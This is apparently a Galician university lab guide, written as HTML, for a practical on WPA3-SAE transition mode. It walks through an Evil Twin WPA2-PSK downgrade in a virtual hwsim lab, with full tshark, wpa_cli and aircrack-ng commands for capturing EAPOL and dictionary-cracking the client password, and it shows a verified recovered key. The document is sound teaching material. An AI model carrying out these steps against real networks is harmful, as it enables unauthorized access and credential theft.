@@ -1,0 +1,265 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Práctica 3.3 — WPA3-SAE: modo transición, simulación de DoS e Evil Twin WPA2-PSK</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Práctica 3.3 — WPA3-SAE: modo transición, simulación de DoS e Evil Twin WPA2-PSK</h1>
+<div class="notice warning"><strong>Laboratorio autorizado</strong>
+<p>Realizar exclusivamente na máquina virtual do laboratorio <code>vuln-wifi.lab</code>, con radios <code>mac80211_hwsim</code>. Non executar estes procedementos sobre redes alleas.</p>
+</div>
+<div class="notice important"><strong>Documento de referencia</strong>
+<p>Práctica <strong>3-Taller-HE-Practica-WiFi-3.pdf</strong>, especialmente a configuración dos AP, a simulación da caída do AP lexítimo e a auditoría WPA2-PSK das páxinas 10–18. Este procedemento adapta as interfaces e os comandos ao escenario automatizado <code>wpa3_sae_vulnerable</code>.</p>
+</div>
+<h2>1. Obxectivo e alcance</h2>
+<p>Comprobar como un cliente configurado para <strong>modo transición</strong> (<code>SAE WPA-PSK</code>) pode intentar autenticarse mediante <strong>WPA2-PSK</strong> cando deixa de estar dispoñible o punto de acceso lexítimo. O experimento emprega dous AP co mesmo SSID <code>EMPRESA-XYZ</code>:</p>
+<ul>
+<li><strong>AP lexítimo:</strong> admite WPA3-SAE e WPA2-PSK; contrasinal didáctico <code>spongebob19</code>.</li>
+<li><strong>Evil Twin:</strong> anuncia só WPA2-PSK e utiliza <code>calqueracousa</code>, un contrasinal diferente do configurado no cliente.</li>
+<li><strong>Cliente:</strong> admite SAE e WPA-PSK, inicialmente conectado ao AP lexítimo mediante SAE.</li>
+</ul>
+<p>O procedemento permite identificar os dous AP, provocar o intento de conexión WPA2-PSK, capturar as mensaxes EAPOL e recuperar o contrasinal didáctico mediante <code>aircrack-ng</code>.</p>
+<div class="notice note"><strong>Que demostra a práctica</strong>
+<p><strong>Non se executa nin se demostra unha explotación Dragonblood ou un DoS real.</strong> Seguindo a alternativa do PDF, detense de forma controlada o AP lexítimo para simular a súa indispoñibilidade. Só falaremos de intento de <em>downgrade</em> se os rexistros ou a captura amosan o cliente negociando WPA2-PSK co Evil Twin. A aparición dun AP falso non implica automaticamente que o cliente o seleccione nin que se complete a conexión.</p>
+</div>
+<h2>2. Material e distribución das terminais</h2>
+<ul>
+<li>Kali con <code>wifilabctl</code>, <code>iw</code>, <code>wpa_cli</code>, <code>tshark</code> e <code>aircrack-ng</code>.</li>
+<li>Escenario <code>wpa3_sae_vulnerable</code> con <strong>catro radios virtuais</strong>.</li>
+<li>Catro terminais abertas en Kali; todos os comandos parten do <strong>namespace global</strong>, salvo onde se indica <code>ip netns exec</code>.</li>
+</ul>
+<p>| Terminal | Radio / namespace | Función |
+|---|---|---|
+| <strong>1</strong> | <code>wlan0</code> / <code>phy0_wlan0</code> | AP lexítimo e simulación da súa caída |
+| <strong>2</strong> | <code>wlan1</code> / <code>phy1_wlan1</code> | Estado e reconexión do cliente |
+| <strong>3</strong> | <code>wlan2</code> / <code>evil_twin_wlan2</code> | AP falso WPA2-PSK e rexistros |
+| <strong>4</strong> | <code>hwsim0</code> (global); <code>wlan3</code> libre | Recoñecemento, captura e auditoría |</p>
+<div class="notice warning"><strong>Non interromper os servizos do laboratorio</strong>
+<p>Non executar <code>airmon-ng check kill</code>, <code>pkill hostapd</code> sen filtrar por PID, nin <code>wifilabctl down</code> durante a captura. Os dous AP xa son iniciados por <code>wifilabctl</code>. A interface global <code>hwsim0</code> permite capturar as tramas virtuais sen reconfigurar <code>wlan3</code> nin depender de <code>iw dev wlan3 scan</code>, que pode devolver <code>Device or resource busy (-16)</code>.</p>
+</div>
+<h2>3. Terminal 1 — Arrancar e comprobar o escenario</h2>
+<pre><code class="language-bash">sudo wifilabctl up wpa3_sae_vulnerable
+sudo wifilabctl status
+</code></pre>
+<p>Deben aparecer os <em>namespaces</em> <code>phy0_wlan0</code>, <code>phy1_wlan1</code> e <code>evil_twin_wlan2</code>, coas radios <code>wlan0</code>, <code>wlan1</code> e <code>wlan2</code>, e <code>wlan3</code> na contorna global.</p>
+<p>Consultar o estado do AP lexítimo:</p>
+<pre><code class="language-bash">sudo ip netns exec phy0_wlan0 iw dev wlan0 info
+
+LAB=/home/kali/wifiLab/run/wpa3_sae_vulnerable
+sudo grep -E '^(ssid|channel|wpa|wpa_key_mgmt|ieee80211w|sae_require_mfp|wpa_passphrase|sae_password)=' \
+  &quot;$LAB/hostapd.conf&quot;
+</code></pre>
+<p>Parámetros de interese:</p>
+<pre><code class="language-ini">ssid=EMPRESA-XYZ
+channel=6
+wpa_key_mgmt=WPA-PSK SAE
+ieee80211w=1
+sae_require_mfp=1
+wpa_passphrase=spongebob19
+sae_password=spongebob19
+</code></pre>
+<p>O BSS anuncia PMF opcional para compatibilidade con WPA2, pero <code>sae_require_mfp=1</code> obriga a utilizalo nas asociacións SAE. <strong>Non confundir <code>ieee80211w=1</code> con PMF desactivado.</strong></p>
+<h2>4. Terminal 2 — Comprobar a conexión inicial do cliente</h2>
+<pre><code class="language-bash">sudo ip netns exec phy1_wlan1 iw dev wlan1 link
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
+</code></pre>
+<p>Comprobar especialmente:</p>
+<pre><code class="language-text">ssid=EMPRESA-XYZ
+key_mgmt=SAE
+wpa_state=COMPLETED
+</code></pre>
+<p>Anotar o BSSID ao que está conectado o cliente: <strong>é o AP lexítimo</strong>. Os enderezos MAC/BSSID son dinámicos e non deben copiarse de exemplos anteriores.</p>
+<p>Comprobar o perfil de transición do cliente:</p>
+<pre><code class="language-bash">sudo grep -E '(ssid=|key_mgmt=|ieee80211w=|sae_password=|psk=)' \
+  /home/kali/wifiLab/run/wpa3_sae_vulnerable/wpa_supplicant.conf
+</code></pre>
+<p>Debe observarse <code>key_mgmt=SAE WPA-PSK</code>.</p>
+<h2>5. Terminal 3 — Comprobar o Evil Twin</h2>
+<pre><code class="language-bash">sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info
+
+LAB=/home/kali/wifiLab/run/wpa3_sae_vulnerable
+sudo grep -E '^(ssid|channel|wpa_key_mgmt|wpa_passphrase|ieee80211w)=' \
+  &quot;$LAB/hostapd_eviltwin.conf&quot;
+
+sudo grep -E 'AP-ENABLED|AP-DISABLED|failed|error' \
+  &quot;$LAB/hostapd_eviltwin.log&quot; | tail -n 20
+</code></pre>
+<p>Debe aparecer <code>type AP</code>, o SSID <code>EMPRESA-XYZ</code>, <code>wpa_key_mgmt=WPA-PSK</code>, o contrasinal <code>calqueracousa</code> e a mensaxe <code>AP-ENABLED</code>.</p>
+<p>Para obter os BSSID reais en calquera terminal:</p>
+<pre><code class="language-bash">AP_BSSID=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1==&quot;addr&quot; {print tolower($2); exit}')
+EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==&quot;addr&quot; {print tolower($2); exit}')
+echo &quot;AP lexítimo: $AP_BSSID&quot;
+echo &quot;Evil Twin:   $EVIL_BSSID&quot;
+</code></pre>
+<h2>6. Terminal 4 — Identificar os dous AP mediante <code>hwsim0</code></h2>
+<p>A interface <code>wlan3</code> pode estar ocupada e non precisamos executar <code>iw dev wlan3 scan</code>. Empregamos a interface global de monitorización <code>hwsim0</code>:</p>
+<pre><code class="language-bash">ip link show hwsim0
+sudo ip link set dev hwsim0 up
+ip link show hwsim0
+
+sudo tshark -i hwsim0 -a duration:15 \
+  -Y 'wlan.fc.type_subtype == 8 &amp;&amp; wlan.ssid == &quot;EMPRESA-XYZ&quot;' \
+  -T fields -e wlan.bssid -e wlan.ssid | sort -u
+</code></pre>
+<p>A saída debería incluír <strong>dous BSSID distintos</strong> co SSID <code>EMPRESA-XYZ</code>. Os dous AP emiten Beacon, pero anuncian diferentes suites de autenticación. Se a captura de 15 segundos non amosa Beacon, comprobar os AP cos comandos das seccións 3 e 5 e continuar: a ausencia desa saída non proba por si soa que o AP estea apagado.</p>
+<div class="notice warning"><strong>Se `hwsim0` aparece `state DOWN` ou `tshark` informa `Permission denied`</strong>
+<p><code>wifilabctl up</code> pode deixar a interface global <code>hwsim0</code> en estado <code>DOWN</code>. Antes da captura, activar a interface <strong>no namespace global</strong>:</p>
+<pre><code class="language-bash">sudo ip link set dev hwsim0 up
+ip -br link show hwsim0
+</code></pre>
+<p>Repetir a captura de Beacon. Se continúa o erro, realizar unha comprobación independente con <code>tcpdump</code> (non é necesario cambiar permisos nin reinstalar Wireshark):</p>
+<pre><code class="language-bash">sudo tcpdump -i hwsim0 -c 10 -w /tmp/proba-hwsim0.pcap
+sudo tshark -r /tmp/proba-hwsim0.pcap \
+  -Y 'wlan.fc.type_subtype == 8' \
+  -T fields -e wlan.bssid -e wlan.ssid | sort -u
+</code></pre>
+<p>Se <code>tcpdump</code> captura correctamente e <code>tshark</code> en directo continúa fallando, para a sección 7 pode substituírse a <strong>captura</strong> por <code>sudo tcpdump -i hwsim0 -w /tmp/wpa3-3.3-transicion.pcap</code>; detela con <strong>Ctrl+C</strong> e empregar <code>tshark -r</code> para a análise posterior, substituíndo o nome do ficheiro <code>.pcapng</code> polo <code>.pcap</code>. Se <code>tcpdump</code> tamén falla, revisar a saída de <code>sudo dumpcap -D</code>, <code>ip link show hwsim0</code> e <code>sudo tcpdump -i hwsim0 -c 3</code>, antes de continuar coa práctica. Non modificar permisos de <code>dumpcap</code> ás cegas.</p>
+</div>
+<p>É posible consultar a información RSN dos Beacon gardando previamente unha captura curta:</p>
+<pre><code class="language-bash">sudo tshark -i hwsim0 -a duration:10 -w /tmp/wpa3-3.3-beacons.pcapng
+
+sudo tshark -r /tmp/wpa3-3.3-beacons.pcapng \
+  -Y 'wlan.fc.type_subtype == 8 &amp;&amp; wlan.ssid == &quot;EMPRESA-XYZ&quot;' \
+  -T fields -e frame.number -e wlan.bssid -e wlan.ssid
+</code></pre>
+<h2>7. Terminal 4 — Iniciar a captura principal</h2>
+<p><strong>Iniciar a captura ANTES de deter o AP lexítimo.</strong> Deixala en marcha mentres se executan as seccións 8–10:</p>
+<pre><code class="language-bash">sudo tshark -i hwsim0 -w /tmp/wpa3-3.3-transicion.pcapng
+</code></pre>
+<p>Non hai un tempo límite automático. Ao finalizar o intento de reconexión, volver a esta terminal e deter a captura con <strong>Ctrl+C</strong>. O ficheiro escríbese en <code>/tmp/</code> para evitar problemas de permisos de <code>dumpcap</code> no directorio persoal.</p>
+<div class="notice note"><strong>Por que `hwsim0`?</strong>
+<p>En <code>mac80211_hwsim</code>, <code>hwsim0</code> permite observar o tráfico entre radios simuladas sen mover a radio atacante a modo monitor. É adecuado para este laboratorio, mesmo cando <code>iw dev wlan3 scan</code> devolve <code>Device or resource busy (-16)</code>.</p>
+</div>
+<h2>8. Terminal 1 — Simular a caída do AP lexítimo</h2>
+<p>O PDF describe primeiro a limitación de <code>dragondrain</code> con <code>mac80211_hwsim</code> e propón a simulación da indispoñibilidade do AP. Co laboratorio automatizado debemos finalizar <strong>só o proceso <code>hostapd</code> do namespace <code>phy0_wlan0</code></strong>.</p>
+<p>Localizar o proceso:</p>
+<pre><code class="language-bash">sudo ip netns pids phy0_wlan0
+
+for pid in $(sudo ip netns pids phy0_wlan0); do
+    printf 'PID=%s PROCESO=%s\n' &quot;$pid&quot; &quot;$(cat /proc/&quot;$pid&quot;/comm 2&gt;/dev/null)&quot;
+done
+</code></pre>
+<p>Detelo de forma selectiva:</p>
+<pre><code class="language-bash">for pid in $(sudo ip netns pids phy0_wlan0); do
+    if [ &quot;$(cat /proc/&quot;$pid&quot;/comm 2&gt;/dev/null)&quot; = &quot;hostapd&quot; ]; then
+        echo &quot;Detendo AP lexítimo: PID=$pid&quot;
+        sudo kill -TERM &quot;$pid&quot;
+    fi
+done
+</code></pre>
+<div class="notice warning"><strong>Importante</strong>
+<p><strong>Non executar <code>sudo pkill hostapd</code></strong>: podería deter tamén o Evil Twin, porque os <em>namespaces</em> de rede non illan a lista de procesos. A selección por PID anterior evita ese problema.</p>
+</div>
+<p>Comprobar que segue vivo o Evil Twin:</p>
+<pre><code class="language-bash">sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info
+sudo ip netns pids evil_twin_wlan2
+</code></pre>
+<p>O Evil Twin debe continuar en <code>type AP</code>. A caída manual do AP lexítimo <strong>simula</strong> unha indispoñibilidade; <strong>non constitúe unha proba de DoS</strong>.</p>
+<h2>9. Terminal 2 — Comprobar o intento de conexión ao Evil Twin</h2>
+<p>Tras deter o AP lexítimo, pedir ao cliente que busque unha conexión:</p>
+<pre><code class="language-bash">sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect
+sleep 10
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
+sudo ip netns exec phy1_wlan1 iw dev wlan1 link
+</code></pre>
+<p>Se non se observa actividade, provocar unha nova reconexión controlada:</p>
+<pre><code class="language-bash">sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect
+sleep 2
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect
+sleep 10
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
+</code></pre>
+<p>O cliente <strong>pode</strong> intentar WPA2-PSK co Evil Twin, porque o seu perfil admite <code>SAE WPA-PSK</code>. Dado que a PSK do Evil Twin é distinta, a autenticación non debería completarse correctamente. Un estado <code>Not connected</code> <strong>non demostra por si só</strong> que se emitise un <em>handshake</em>: cómpre revisar os rexistros e a captura.</p>
+<h2>10. Terminal 3 — Revisar os rexistros do Evil Twin</h2>
+<pre><code class="language-bash">sudo tail -n 100 \
+  /home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd_eviltwin.log
+</code></pre>
+<p>Mensaxes de especial interese:</p>
+<pre><code class="language-text">wlan2: STA ... IEEE 802.11: authenticated
+wlan2: STA ... IEEE 802.11: associated
+wlan2: AP-STA-POSSIBLE-PSK-MISMATCH ...
+</code></pre>
+<p>Estas mensaxes, <strong>se aparecen</strong>, indican que un cliente intentou autenticarse no AP falso cunha PSK que non coincide coa súa. <code>AP-STA-POSSIBLE-PSK-MISMATCH</code> non significa que o contrasinal do cliente se transmitise en claro.</p>
+<h2>11. Terminal 4 — Deter e analizar a captura</h2>
+<p>Volver á terminal onde se executa <code>tshark -i hwsim0 -w ...</code> e premer <strong>Ctrl+C</strong>.</p>
+<p>Comprobar o ficheiro:</p>
+<pre><code class="language-bash">sudo capinfos /tmp/wpa3-3.3-transicion.pcapng
+</code></pre>
+<p>Listar os paquetes EAPOL:</p>
+<pre><code class="language-bash">sudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \
+  -Y 'eapol' -T fields \
+  -e frame.number -e _ws.col.Info \
+  -e wlan.bssid -e wlan.sa -e wlan.da \
+  -e eapol.keydes.replay_counter \
+  -e wlan_rsna_eapol.keydes.msgnr
+</code></pre>
+<p>Distinguir o EAPOL do Evil Twin do correspondente ao AP lexítimo. Obter o BSSID real do Evil Twin e filtrar:</p>
+<pre><code class="language-bash">EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==&quot;addr&quot; {print tolower($2); exit}')
+
+echo &quot;Filtrando EAPOL do Evil Twin: $EVIL_BSSID&quot;
+sudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \
+  -Y &quot;eapol &amp;&amp; wlan.bssid == $EVIL_BSSID&quot; -T fields \
+  -e frame.number -e _ws.col.Info -e wlan.sa -e wlan.da \
+  -e eapol.keydes.replay_counter
+</code></pre>
+<p>Para observar tamén as tramas de autenticación e asociación:</p>
+<pre><code class="language-bash">sudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \
+  -Y &quot;wlan.bssid == $EVIL_BSSID &amp;&amp; (wlan.fc.type_subtype == 0x000b || wlan.fc.type_subtype == 0x0000 || eapol)&quot; \
+  -T fields -e frame.number -e _ws.col.Info -e wlan.sa -e wlan.da
+</code></pre>
+<p><strong>Interpretación:</strong></p>
+<ul>
+<li><strong>EAPOL dirixidos ao BSSID do Evil Twin:</strong> evidencian o intento de autenticación WPA2-PSK co punto de acceso falso.</li>
+<li><strong>Mensaxes de autenticación ou asociación e PSK distinta:</strong> o cliente pode enviar información suficiente para verificar unha PSK sen completar a conexión.</li>
+<li><strong>Auditoría do paso 12:</strong> Aircrack-ng confirmou a recuperación de <code>spongebob19</code>, polo que a captura obtida nesta execución contiña material WPA2-PSK válido.</li>
+</ul>
+<h2>12. Terminal 4 — Auditoría do contrasinal WPA2-PSK con Aircrack-ng</h2>
+<p>A captura do intento de conexión WPA2-PSK co Evil Twin permite auditar o contrasinal que utiliza o cliente. A rede lexítima utiliza SAE inicialmente; <strong>esta proba non consiste en descifrar SAE</strong>.</p>
+<p>Empregar un dicionario didáctico de tres entradas para comprobar o intercambio WPA2-PSK capturado:</p>
+<pre><code class="language-bash">printf 'contraseña-de-proba\nspongebob19\nclave-incorrecta\n' &gt; /tmp/wpa3-3.3-dicionario.txt
+
+EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==&quot;addr&quot; {print tolower($2); exit}')
+
+sudo aircrack-ng -b &quot;$EVIL_BSSID&quot; \
+  -w /tmp/wpa3-3.3-dicionario.txt \
+  /tmp/wpa3-3.3-transicion.pcapng
+</code></pre>
+<p>A saída <strong>comprobada na VM</strong> con Aircrack-ng 1.7 foi:</p>
+<pre><code class="language-text">Aircrack-ng 1.7
+
+[00:00:00] 3/3 keys tested (80.71 k/s)
+
+KEY FOUND! [ spongebob19 ]
+</code></pre>
+<p>O resultado confirma que a captura WPA2-PSK permite verificar o contrasinal <code>spongebob19</code>, malia que o Evil Twin anuncie outra PSK e a asociación non chegue a completarse. O <em>handshake</em> SAE inicial do AP lexítimo non se rompeu.</p>
+<p><strong>Auditoría adicional co dicionario <code>rockyou</code> empregado no PDF:</strong></p>
+<pre><code class="language-bash">if [ -f /usr/share/wordlists/rockyou.txt ]; then
+    cp /usr/share/wordlists/rockyou.txt /tmp/rockyou-3.3.txt
+elif [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
+    gzip -dc /usr/share/wordlists/rockyou.txt.gz &gt; /tmp/rockyou-3.3.txt
+fi
+
+# Executar con rockyou cando o ficheiro estea dispoñible:
+EVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==&quot;addr&quot; {print tolower($2); exit}')
+sudo aircrack-ng -b &quot;$EVIL_BSSID&quot; \
+  -w /tmp/rockyou-3.3.txt \
+  /tmp/wpa3-3.3-transicion.pcapng
+</code></pre>
+<p>A verificación confirmada nesta práctica corresponde ao <strong>dicionario de tres entradas</strong>. A opción <code>rockyou</code> reproduce a auditoría con dicionario amplo do PDF, sen ser necesaria para demostrar a recuperación da clave.</p>
+<div class="notice note"><strong>Que significa recuperar `spongebob19`?</strong>
+<p>Significa que se puido verificar <em>offline</em> un contrasinal candidato a partir dunha captura <strong>WPA2-PSK</strong> do cliente. Non significa que se descifrase SAE nin que o Evil Twin chegase a establecer unha sesión cifrada con éxito. A diferenza entre as dúas autenticacións é o obxectivo central desta práctica.</p>
+</div>
+<h2>13. Restaurar o laboratorio</h2>
+<p>A simulación da caída do AP lexítimo interrompe un proceso do escenario. Para restaurar a topoloxía funcional:</p>
+<pre><code class="language-bash">sudo wifilabctl up wpa3_sae_vulnerable
+sudo wifilabctl status
+sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status
+</code></pre>
+<p>O cliente debería volver conectarse mediante <code>SAE</code> ao AP lexítimo. Os ficheiros de captura e os dicionarios gardados en <code>/tmp</code> poden permanecer ata o seguinte reinicio do sistema.</p>
+<h2>14. Resultado e interpretación da práctica</h2>
+<p>O procedemento permite comprobar as seguintes evidencias. A recuperación do contrasinal co dicionario de tres palabras foi verificada na VM:</p>
+<p>| Observación | Conclusión que permite |
+|---|---|
+| Dous BSSID con SSID idéntico e RSN diferente | Coexistencia de AP lexítimo e Evil Twin |
+| <code>key_mgmt=SAE</code> e <code>COMPLETED</code> antes da simulación | Autenticación WPA3-SAE inicial correcta |
+| AP lexítimo detido, Evil Twin activo | Indispoñibilidade simulada, non DoS probado |
+| Cliente tenta WPA2-PSK contra o BSSID do Evil Twin | Intento real de selección/degradación cara a WPA2 |
+| EAPOL de WPA2-PSK capturado e aceptado por Aircrack-ng | Captura válida para a auditoría <em>offline</em> |
+| <code>KEY FOUND</code> mediante Aircrack-ng | <strong>Resultado verificado: <code>spongebob19</code></strong>, a partir do intercambio WPA2 capturado |</p>
+<p>A captura obtida durante o intento WPA2-PSK foi suficiente para verificar o MIC e recuperar <code>spongebob19</code>. O experimento non require que o Evil Twin estableza unha conexión completada. <strong>A caída do AP lexítimo foi simulada:</strong> non se demostrou un DoS por Dragondrain nin a recuperación dunha clave mediante o intercambio SAE.</p>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
